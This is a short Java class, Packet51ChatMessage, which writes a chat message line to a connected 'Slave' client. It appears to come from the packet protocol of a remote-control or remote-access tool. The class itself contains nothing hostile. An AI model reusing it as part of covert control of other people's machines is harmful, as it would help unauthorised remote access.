package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet51ChatMessage extends AbstractOutgoingPacket {

	private String message;
	
	public Packet51ChatMessage(String message) {
		this.message = message;
	}
	
	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(message);
	}

	@Override
	public byte getPacketId() {
		return 51;
	}

}
